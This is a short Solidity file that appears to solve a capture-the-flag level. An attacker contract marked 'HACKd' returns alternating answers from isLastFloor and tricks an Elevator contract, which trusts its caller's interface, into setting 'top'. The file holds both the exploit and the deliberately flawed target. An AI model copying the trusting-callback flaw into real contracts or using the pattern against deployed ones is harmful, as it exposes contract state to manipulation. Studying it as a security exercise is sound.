// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

//HACKd
contract BuildingContract is Building {
    bool step = false;
    function isLastFloor(uint) external returns (bool) {
        bool prevStep = step;
        step = !prevStep;
        return prevStep;
    }

    function goTo(address elevatorAddress) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(0);
    }
}
//

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
